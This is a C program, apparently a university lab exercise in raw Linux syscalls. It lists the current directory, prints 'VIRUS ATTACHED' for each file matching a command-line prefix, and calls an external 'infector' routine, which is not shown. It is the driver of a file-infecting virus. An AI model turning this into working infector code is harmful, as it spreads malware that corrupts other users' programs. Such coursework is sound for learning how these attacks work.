#include <unistd.h>
#include "util.h"

#define SYS_WRITE 4
#define SYS_EXIT 1
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define O_RDWR 2
#define O_RDONLY 0
#define O_WRONLY 1
#define O_APPEND 1024
#define O_TRUNC 512
#define O_CREAT 64
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define BUF_SIZE 8192

extern int system_call();
extern void infector();

typedef struct ent {
    int inode;
    int offset;
    short len;
    char buf[1];
}ent;

int main (int argc , char* argv[], char* envp[])
{
  char* prefix = NULL;
  int i = 1; 

  while(i < argc){
     if((strncmp(argv[i],"-a", 2) == 0)){
        prefix = argv[i] + 2;
        /*system_call(SYS_WRITE, STDOUT, prefix, strlen(prefix));*/
        }
        i++;           
  }
  if(prefix == NULL){
    return 0;
  }
  /*system_call(SYS_WRITE, STDOUT, prefix, strlen(prefix));*/

  char buf[BUF_SIZE];
  int fd;
  int count;
  ent *entp = (ent *) buf;
  long bpos = 0;
  
  fd = system_call(SYS_OPEN, ".", O_RDONLY);
  if(fd < 0){
    system_call(SYS_EXIT, 0x55);
  }

  count = system_call(141, fd,buf,BUF_SIZE);
  


  while(bpos < count){
    
    char* filename = entp->buf;
    if(strncmp(filename, prefix, strlen(prefix)) == 0){
      
      system_call(SYS_WRITE, STDOUT, filename, strlen(filename));
      system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
      system_call(SYS_WRITE, STDOUT, "\n", 1);

      infector(filename);
    }
    
    bpos += entp->len;
    entp = (ent *) (buf + bpos);

  }
  system_call(SYS_CLOSE, fd);

  return 0;
  }
